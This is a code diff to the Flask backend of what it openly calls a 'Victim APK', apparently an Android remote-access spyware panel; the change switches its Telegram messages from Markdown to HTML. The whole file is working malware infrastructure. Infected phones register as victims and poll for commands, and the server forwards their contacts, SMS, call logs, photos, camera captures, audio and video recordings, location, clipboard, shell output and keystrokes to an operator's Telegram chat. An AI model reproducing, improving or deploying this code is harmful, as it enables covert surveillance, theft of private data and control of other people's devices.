@@ -1,13 +1,14 @@
 # api_victim.py
 # ============================================================
-# API للضحية (Victim APK) — v5
-# إرسال فوري — بدون أي تخزين في Redis
+# API للضحية (Victim APK) — v6
+# يستخدم HTML بدل Markdown لتجنب أخطاء الرموز
 # ============================================================
 
 import io
 import base64
 import time
 import threading
+import html
 from flask import request, jsonify
 
 from config import bot, redis_client
@@ -20,8 +21,15 @@ from imports_manager import (
 )
 
 
+def h(text):
+    """★ Escape HTML"""
+    if text is None:
+        return ""
+    return html.escape(str(text))
+
+
 # ============================================================
-# ★★★ Buffers — تجميع سريع في الذاكرة فقط ★★★
+# ★★★ Buffers ★★★
 # ============================================================
 class VictimBuffer:
     def __init__(self, victim_id, chat_id, victim_name):
@@ -33,8 +41,6 @@ class VictimBuffer:
         self.photos = []
         self.photos_total = 0
         self.lock = threading.Lock()
-        self.last_contacts_time = time.time()
-        self.last_photos_time = time.time()
 
 
 _buffers = {}
@@ -51,18 +57,6 @@ def _get_buffer(victim_id, chat_id, victim_name):
         return buf
 
 
-def _cleanup_buffer(victim_id):
-    with _buffers_lock:
-        if victim_id in _buffers:
-            try:
-                del _buffers[victim_id]
-            except Exception:
-                pass
-
-
-# ============================================================
-# ★★★ إرسال جهات الاتصال — منظم + مباشر ★★★
-# ============================================================
 def _send_contacts_batch(victim_id):
     with _buffers_lock:
         buf = _buffers.get(victim_id)
@@ -71,53 +65,42 @@ def _send_contacts_batch(victim_id):
         contacts = list(buf.contacts)
         total = buf.contacts_total or len(contacts)
         buf.contacts = []
-        buf.last_contacts_time = time.time()
-    
+
     try:
         cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
-        
-        # ★ ملف نصي منظم
+
         lines = [
-            f"📇 جهات الاتصال — {buf.victim_name}",
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            f"📊 العدد: {len(contacts)} / {total}",
-            f"",
+            f"📇 <b>جهات الاتصال</b> — {h(buf.victim_name)}",
+            f"━━━━━━━━━━━━━━━━━━",
+            f"📊 <b>العدد:</b> {len(contacts)} / {total}",
+            "",
         ]
-        
+
         for i, c in enumerate(contacts, 1):
-            name = c.get("name", "—") or "—"
-            number = c.get("number", "—") or "—"
-            lines.append(f"{i}. {name}")
-            lines.append(f"   📞 {number}")
+            name = h(c.get("name") or "—")
+            number = h(c.get("number") or "—")
+            lines.append(f"<b>{i}.</b> {name}")
+            lines.append(f"   📞 <code>{number}</code>")
             lines.append("")
-        
+
         content = "\n".join(lines)
-        
+
         if len(content) > 3000:
             buf_io = io.BytesIO(content.encode('utf-8'))
-            buf_io.name = f"contacts_{buf.victim_name[:20]}_{len(contacts)}.txt"
+            buf_io.name = f"contacts_{len(contacts)}.txt"
             bot.send_document(
                 cid, buf_io,
-                caption=f"📇 **جهات الاتصال ({len(contacts)}/{total})**\n"
-                        f"👤 `{buf.victim_name}`",
-                parse_mode="Markdown"
+                caption=f"📇 <b>جهات الاتصال ({len(contacts)}/{total})</b>",
+                parse_mode="HTML"
             )
         else:
-            bot.send_message(
-                cid,
-                f"📇 **جهات الاتصال ({len(contacts)}/{total})**\n"
-                f"```\n{content[:3000]}\n```",
-                parse_mode="Markdown"
-            )
-        
+            bot.send_message(cid, content, parse_mode="HTML")
+
         print(f"[+] Contacts batch sent: {len(contacts)}")
     except Exception as e:
         print(f"[-] send contacts batch error: {e}")
 
 
-# ============================================================
-# ★★★ إرسال الصور — مباشرة ★★★
-# ============================================================
 def _send_photos_batch(victim_id):
     with _buffers_lock:
         buf = _buffers.get(victim_id)
@@ -126,12 +109,10 @@ def _send_photos_batch(victim_id):
         photos = list(buf.photos)
         total = buf.photos_total or len(photos)
         buf.photos = []
-        buf.last_photos_time = time.time()
-    
+
     try:
         cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
-        
-        # ★ لو 3 صور أو أقل — أرسل مباشرة
+
         if len(photos) <= 3:
             for i, (name, img_bytes) in enumerate(photos, 1):
                 try:
@@ -139,31 +120,28 @@ def _send_photos_batch(victim_id):
                     buf_io.name = name
                     bot.send_photo(
                         cid, buf_io,
-                        caption=f"🖼️ **{name}** ({i}/{len(photos)})\n👤 `{buf.victim_name}`",
-                        parse_mode="Markdown"
+                        caption=f"🖼️ <b>{h(name)}</b> ({i}/{len(photos)})",
+                        parse_mode="HTML"
                     )
                     time.sleep(0.5)
                 except Exception as e:
                     print(f"[-] photo {i}: {e}")
         else:
-            # ★ ZIP
             import zipfile
             zip_buffer = io.BytesIO()
             with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                 for name, img_bytes in photos:
                     zf.writestr(name, img_bytes)
-            
+
             zip_buffer.seek(0)
-            zip_buffer.name = f"photos_{buf.victim_name[:20]}_{len(photos)}.zip"
-            
+            zip_buffer.name = f"photos_{len(photos)}.zip"
+
             bot.send_document(
                 cid, zip_buffer,
-                caption=f"🖼️ **الصور ({len(photos)}/{total})**\n"
-                        f"👤 `{buf.victim_name}`\n"
-                        f"📦 ملف ZIP",
-                parse_mode="Markdown"
+                caption=f"🖼️ <b>الصور ({len(photos)}/{total})</b>\n📦 ملف ZIP",
+                parse_mode="HTML"
             )
-        
+
         print(f"[+] Photos batch sent: {len(photos)}")
     except Exception as e:
         print(f"[-] send photos batch error: {e}")
@@ -177,9 +155,6 @@ def init_victim_api(app, bot_instance=None):
     if bot_instance:
         bot = bot_instance
 
-    # ============================================================
-    # Register
-    # ============================================================
     @app.route('/apk/victim/register', methods=['POST'])
     def victim_register():
         try:
@@ -191,7 +166,6 @@ def init_victim_api(app, bot_instance=None):
 
             victim_info = find_victim_by_token(victim_token)
             if not victim_info:
-                print(f"[-] Invalid victim_token: {victim_token[:16]}")
                 return jsonify({"error": "invalid_token"}), 403
 
             chat_id = victim_info['chat_id']
@@ -215,14 +189,14 @@ def init_victim_api(app, bot_instance=None):
                 cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                 bot.send_message(
                     cid,
-                    f"✅ **ضحية جديدة متصلة!**\n"
+                    f"✅ <b>ضحية جديدة متصلة!</b>\n"
                     f"━━━━━━━━━━━━━━━━━━\n"
-                    f"👤 **الاسم:** `{victim_name}`\n"
-                    f"📱 **الموديل:** `{brand} {model}`\n"
-                    f"🤖 **Android:** `{android}` (SDK {sdk})\n"
-                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
-                    f"🎛️ **استخدم:** /panel للتحكم",
-                    parse_mode="Markdown"
+                    f"👤 <b>الاسم:</b> <code>{h(victim_name)}</code>\n"
+                    f"📱 <b>الموديل:</b> <code>{h(brand)} {h(model)}</code>\n"
+                    f"🤖 <b>Android:</b> <code>{h(android)}</code> (SDK {sdk})\n"
+                    f"🆔 <b>Device:</b> <code>{h(device_id[:16])}</code>\n\n"
+                    f"🎛️ استخدم /panel للتحكم",
+                    parse_mode="HTML"
                 )
             except Exception as e:
                 print(f"[-] notify error: {e}")
@@ -232,15 +206,12 @@ def init_victim_api(app, bot_instance=None):
             print(f"[-] register error: {e}")
             return jsonify({"error": str(e)}), 500
 
-    # ============================================================
-    # Poll — تحقق سريع أولاً
-    # ============================================================
     @app.route('/apk/victim/poll', methods=['GET'])
     def victim_poll():
         try:
             victim_token = request.args.get('token', '').strip()
             check_only = request.args.get('check', '') == '1'
-            
+
             if not victim_token:
                 return jsonify({"commands": [], "has": False}), 200
 
@@ -250,8 +221,7 @@ def init_victim_api(app, bot_instance=None):
 
             victim_id = victim_info['victim_id']
             chat_id = victim_info['chat_id']
-            
-            # ★ تحقق سريع فقط
+
             if check_only:
                 has = has_victim_commands(victim_id)
                 return jsonify({"has": has}), 200
@@ -267,9 +237,6 @@ def init_victim_api(app, bot_instance=None):
             print(f"[-] poll error: {e}")
             return jsonify({"commands": [], "has": False}), 200
 
-    # ============================================================
-    # Data
-    # ============================================================
     @app.route('/apk/victim/data', methods=['POST'])
     def victim_data():
         try:
@@ -292,7 +259,7 @@ def init_victim_api(app, bot_instance=None):
             print(f"[<<] {dtype} from {victim_name}")
 
             # ============================================================
-            # Camera Photo
+            # Camera
             # ============================================================
             if dtype == "camera_photo":
                 img_data = data.get('image', '')
@@ -307,34 +274,30 @@ def init_victim_api(app, bot_instance=None):
                         buf_io.name = f"camera_{cam_name}.jpg"
                         bot.send_photo(
                             cid, buf_io,
-                            caption=f"📸 **{cam_icon}**\n"
-                                    f"👤 `{victim_name}`\n"
-                                    f"🆔 `{victim_id[:8]}`",
-                            parse_mode="Markdown"
+                            caption=f"📸 <b>{cam_icon}</b>\n👤 {h(victim_name)}",
+                            parse_mode="HTML"
                         )
                     except Exception as e:
                         print(f"[-] photo error: {e}")
 
             # ============================================================
-            # Photo Single — تجميع وإرسال
+            # Photo Single
             # ============================================================
             elif dtype == "photo_single":
                 img_data = data.get("image", "")
                 img_name = data.get("name", "photo.jpg")
-                index = data.get("index", 0)
                 total = data.get("total", 1)
-                
+
                 if img_data and img_data.startswith("data:image"):
                     try:
                         _, encoded = img_data.split(",", 1)
                         img_bytes = base64.b64decode(encoded)
-                        
+
                         buf = _get_buffer(victim_id, cid, victim_name)
                         with buf.lock:
                             buf.photos.append((img_name, img_bytes))
                             buf.photos_total = total
-                        
-                        # ★ إرسال كل 3 صور
+
                         if len(buf.photos) >= 3:
                             _send_photos_batch(victim_id)
                     except Exception as e:
@@ -346,28 +309,26 @@ def init_victim_api(app, bot_instance=None):
                 try:
                     bot.send_message(
                         cid,
-                        f"✅ **تم استلام الصور** — `{victim_name}`\n"
-                        f"📊 الإجمالي: `{total}`",
-                        parse_mode="Markdown"
+                        f"✅ <b>تم استلام الصور</b> — {h(victim_name)}\n"
+                        f"📊 الإجمالي: {total}",
+                        parse_mode="HTML"
                     )
                 except Exception:
                     pass
 
             # ============================================================
-            # Contacts — تجميع وإرسال
+            # Contacts
             # ============================================================
             elif dtype == "contacts":
                 contact = data.get("contact", None)
-                index = data.get("index", 0)
                 total = data.get("total", 0)
-                
+
                 if contact:
                     buf = _get_buffer(victim_id, cid, victim_name)
                     with buf.lock:
                         buf.contacts.append(contact)
                         buf.contacts_total = total
-                    
-                    # ★ إرسال كل 50 جهة
+
                     if len(buf.contacts) >= 50:
                         _send_contacts_batch(victim_id)
 
@@ -377,9 +338,9 @@ def init_victim_api(app, bot_instance=None):
                 try:
                     bot.send_message(
                         cid,
-                        f"✅ **تم استلام جهات الاتصال** — `{victim_name}`\n"
-                        f"📊 الإجمالي: `{total}`",
-                        parse_mode="Markdown"
+                        f"✅ <b>تم استلام جهات الاتصال</b> — {h(victim_name)}\n"
+                        f"📊 الإجمالي: {total}",
+                        parse_mode="HTML"
                     )
                 except Exception:
                     pass
@@ -398,9 +359,8 @@ def init_victim_api(app, bot_instance=None):
                         buf_io.name = "record.mp4"
                         bot.send_video(
                             cid, buf_io,
-                            caption=f"🎥 **فيديو {duration/1000:.1f} ثانية**\n"
-                                    f"👤 `{victim_name}`",
-                            parse_mode="Markdown"
+                            caption=f"🎥 <b>فيديو {duration/1000:.1f} ثانية</b>\n👤 {h(victim_name)}",
+                            parse_mode="HTML"
                         )
                     except Exception as e:
                         print(f"[-] video error: {e}")
@@ -419,9 +379,8 @@ def init_victim_api(app, bot_instance=None):
                         buf_io.name = "record.3gp"
                         bot.send_audio(
                             cid, buf_io,
-                            caption=f"🎙️ **صوت {duration/1000:.1f} ثانية**\n"
-                                    f"👤 `{victim_name}`",
-                            parse_mode="Markdown"
+                            caption=f"🎙️ <b>صوت {duration/1000:.1f} ثانية</b>\n👤 {h(victim_name)}",
+                            parse_mode="HTML"
                         )
                     except Exception as e:
                         print(f"[-] audio error: {e}")
@@ -431,14 +390,14 @@ def init_victim_api(app, bot_instance=None):
             # ============================================================
             elif dtype == "device_info":
                 text = (
-                    f"📱 **معلومات الجهاز**\n"
+                    f"📱 <b>معلومات الجهاز</b>\n"
                     f"━━━━━━━━━━━━━━━━━━\n"
-                    f"👤 `{victim_name}`\n"
-                    f"📦 الموديل: `{data.get('model')}`\n"
-                    f"🏭 الشركة: `{data.get('brand')}`\n"
-                    f"🤖 Android: `{data.get('android')}`"
+                    f"👤 <code>{h(victim_name)}</code>\n"
+                    f"📦 الموديل: <code>{h(data.get('model'))}</code>\n"
+                    f"🏭 الشركة: <code>{h(data.get('brand'))}</code>\n"
+                    f"🤖 Android: <code>{h(data.get('android'))}</code>"
                 )
-                bot.send_message(cid, text, parse_mode="Markdown")
+                bot.send_message(cid, text, parse_mode="HTML")
 
             # ============================================================
             # Battery
@@ -447,12 +406,12 @@ def init_victim_api(app, bot_instance=None):
                 level = data.get('level', 0)
                 charging = data.get('charging', False)
                 text = (
-                    f"🔋 **البطارية**\n"
-                    f"👤 `{victim_name}`\n"
-                    f"📊 `{level}%`\n"
-                    f"⚡ `{'يشحن' if charging else 'لا يشحن'}`"
+                    f"🔋 <b>البطارية</b>\n"
+                    f"👤 <code>{h(victim_name)}</code>\n"
+                    f"📊 <b>{level}%</b>\n"
+                    f"⚡ {'يشحن' if charging else 'لا يشحن'}"
                 )
-                bot.send_message(cid, text, parse_mode="Markdown")
+                bot.send_message(cid, text, parse_mode="HTML")
 
             # ============================================================
             # SMS
@@ -460,27 +419,27 @@ def init_victim_api(app, bot_instance=None):
             elif dtype == "sms":
                 sms_list = data.get("sms", [])
                 if not sms_list:
-                    bot.send_message(cid, f"📭 لا رسائل من {victim_name}")
+                    bot.send_message(cid, f"📭 لا رسائل من {h(victim_name)}", parse_mode="HTML")
                 else:
                     lines = [
-                        f"📨 SMS — {victim_name}",
-                        f"━━━━━━━━━━━━━━━━━━",
-                        f"📊 العدد: {len(sms_list)}",
+                        f"📨 <b>SMS — {h(victim_name)}</b>",
+                        "━━━━━━━━━━━━━━━━━━",
+                        f"📊 العدد: <b>{len(sms_list)}</b>",
                         "",
                     ]
                     for s in sms_list[:50]:
-                        lines.append(f"📩 من: {s.get('from')}")
-                        lines.append(f"   {s.get('body','')[:200]}")
+                        lines.append(f"📩 من: <code>{h(s.get('from'))}</code>")
+                        lines.append(f"   {h(s.get('body', '')[:200])}")
                         lines.append("")
-                    
+
                     msg = "\n".join(lines)
-                    
+
                     if len(msg) > 3000:
                         buf_io = io.BytesIO(msg.encode('utf-8'))
-                        buf_io.name = f"sms_{victim_name[:20]}.txt"
-                        bot.send_document(cid, buf_io, caption=f"📨 SMS ({len(sms_list)})", parse_mode="Markdown")
+                        buf_io.name = "sms.txt"
+                        bot.send_document(cid, buf_io, caption=f"📨 SMS ({len(sms_list)})", parse_mode="HTML")
                     else:
-                        bot.send_message(cid, msg, parse_mode="Markdown")
+                        bot.send_message(cid, msg, parse_mode="HTML")
 
             # ============================================================
             # Calls
@@ -489,16 +448,16 @@ def init_victim_api(app, bot_instance=None):
                 calls = data.get("calls", [])
                 type_map = {"1": "📥", "2": "📤", "3": "❌"}
                 lines = [
-                    f"📞 سجل المكالمات — {victim_name}",
-                    f"━━━━━━━━━━━━━━━━━━",
-                    f"📊 العدد: {len(calls)}",
+                    f"📞 <b>سجل المكالمات — {h(victim_name)}</b>",
+                    "━━━━━━━━━━━━━━━━━━",
+                    f"📊 العدد: <b>{len(calls)}</b>",
                     "",
                 ]
                 for c in calls[:50]:
                     t = type_map.get(str(c.get('type','')), '❓')
-                    lines.append(f"{t} {c.get('number')} — {c.get('duration')}s")
-                
-                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
+                    lines.append(f"{t} <code>{h(c.get('number'))}</code> — {c.get('duration')}s")
+
+                bot.send_message(cid, "\n".join(lines), parse_mode="HTML")
 
             # ============================================================
             # Apps
@@ -506,22 +465,22 @@ def init_victim_api(app, bot_instance=None):
             elif dtype == "apps":
                 apps = data.get("apps", [])
                 lines = [
-                    f"📲 التطبيقات — {victim_name}",
-                    f"━━━━━━━━━━━━━━━━━━",
-                    f"📊 العدد: {len(apps)}",
+                    f"📲 <b>التطبيقات — {h(victim_name)}</b>",
+                    "━━━━━━━━━━━━━━━━━━",
+                    f"📊 العدد: <b>{len(apps)}</b>",
                     "",
                 ]
                 for a in apps[:100]:
-                    lines.append(f"• {a.get('name')}")
-                
+                    lines.append(f"• {h(a.get('name'))}")
+
                 msg = "\n".join(lines)
-                
+
                 if len(msg) > 3000:
                     buf_io = io.BytesIO(msg.encode('utf-8'))
-                    buf_io.name = f"apps_{victim_name[:20]}.txt"
-                    bot.send_document(cid, buf_io, caption=f"📲 التطبيقات", parse_mode="Markdown")
+                    buf_io.name = "apps.txt"
+                    bot.send_document(cid, buf_io, caption="📲 التطبيقات", parse_mode="HTML")
                 else:
-                    bot.send_message(cid, msg, parse_mode="Markdown")
+                    bot.send_message(cid, msg, parse_mode="HTML")
 
             # ============================================================
             # Location
@@ -530,15 +489,16 @@ def init_victim_api(app, bot_instance=None):
                 lat = data.get("lat")
                 lng = data.get("lng")
                 if lat and lng:
+                    maps_url = f"https://maps.google.com/?q={lat},{lng}"
                     bot.send_message(
                         cid,
-                        f"📍 **الموقع** — `{victim_name}`\n"
-                        f"`{lat}, {lng}`\n"
-                        f"[خرائط](https://maps.google.com/?q={lat},{lng})",
-                        parse_mode="Markdown"
+                        f"📍 <b>الموقع</b> — {h(victim_name)}\n"
+                        f"<code>{lat}, {lng}</code>\n"
+                        f'<a href="{maps_url}">🗺️ خرائط جوجل</a>',
+                        parse_mode="HTML"
                     )
                 else:
-                    bot.send_message(cid, f"❌ لا يوجد موقع من {victim_name}")
+                    bot.send_message(cid, f"❌ لا يوجد موقع من {h(victim_name)}", parse_mode="HTML")
 
             # ============================================================
             # Clipboard
@@ -548,21 +508,22 @@ def init_victim_api(app, bot_instance=None):
                 if text:
                     bot.send_message(
                         cid,
-                        f"📋 **الحافظة** — `{victim_name}`\n```\n{text[:500]}\n```",
-                        parse_mode="Markdown"
+                        f"📋 <b>الحافظة</b> — {h(victim_name)}\n"
+                        f"<pre>{h(text[:500])}</pre>",
+                        parse_mode="HTML"
                     )
                 else:
-                    bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")
+                    bot.send_message(cid, f"📋 الحافظة فاضية — {h(victim_name)}", parse_mode="HTML")
 
             # ============================================================
             # Photos List
             # ============================================================
             elif dtype == "photos":
                 photos = data.get("photos", [])
-                lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
+                lines = [f"🖼️ <b>الصور ({len(photos)})</b> — {h(victim_name)}"]
                 for p in photos[:20]:
-                    lines.append(f"• `{p.get('path')}`")
-                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
+                    lines.append(f"• <code>{h(p.get('path'))}</code>")
+                bot.send_message(cid, "\n".join(lines), parse_mode="HTML")
 
             # ============================================================
             # Shell
@@ -572,9 +533,10 @@ def init_victim_api(app, bot_instance=None):
                 output = data.get("output", "")
                 bot.send_message(
                     cid,
-                    f"💻 **Shell** — `{victim_name}`\n"
-                    f"`{cmd}`\n```\n{output[:2000]}\n```",
-                    parse_mode="Markdown"
+                    f"💻 <b>Shell</b> — {h(victim_name)}\n"
+                    f"<code>{h(cmd)}</code>\n"
+                    f"<pre>{h(output[:2000])}</pre>",
+                    parse_mode="HTML"
                 )
 
             # ============================================================
@@ -587,10 +549,10 @@ def init_victim_api(app, bot_instance=None):
                 if status == "fail":
                     bot.send_message(
                         cid,
-                        f"❌ **فشل أمر على `{victim_name}`**\n"
-                        f"الأمر: `{action}`\n"
-                        f"السبب: `{error[:200]}`",
-                        parse_mode="Markdown"
+                        f"❌ <b>فشل أمر على {h(victim_name)}</b>\n"
+                        f"الأمر: <code>{h(action)}</code>\n"
+                        f"السبب: <code>{h(error[:200])}</code>",
+                        parse_mode="HTML"
                     )
 
             # ============================================================
@@ -601,9 +563,9 @@ def init_victim_api(app, bot_instance=None):
                 if text.strip():
                     bot.send_message(
                         cid,
-                        f"⌨️ **لوحة مفاتيح** — `{victim_name}`\n"
-                        f"```\n{text[:500]}\n```",
-                        parse_mode="Markdown"
+                        f"⌨️ <b>لوحة مفاتيح</b> — {h(victim_name)}\n"
+                        f"<pre>{h(text[:500])}</pre>",
+                        parse_mode="HTML"
                     )
 
             elif dtype == "heartbeat":
